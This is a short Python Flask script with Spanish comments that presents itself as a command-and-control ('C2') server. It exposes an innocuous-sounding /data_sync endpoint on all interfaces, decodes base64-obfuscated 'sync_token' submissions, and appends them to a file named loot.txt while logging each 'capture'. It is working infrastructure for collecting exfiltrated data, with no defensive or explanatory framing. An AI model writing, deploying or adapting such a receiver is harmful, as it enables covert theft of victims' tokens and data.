from flask import Flask, request
import base64

app = Flask(__name__)

@app.route('/data_sync', methods=['POST'])
def receive_data():
    # Recibe el token ofuscado 
    encoded_data = request.form.get('sync_token')
    if encoded_data:
        decoded_data = base64.b64decode(encoded_data).decode()
        with open("loot.txt", "a") as f:
            f.write(decoded_data)
        print(f"[+] Captura recibida: {decoded_data}")
    return "OK", 200

if __name__ == "__main__":
    print("[*] Servidor C2 Iniciado - Esperando conexiones...")
    app.run(host='0.0.0.0', port=5000)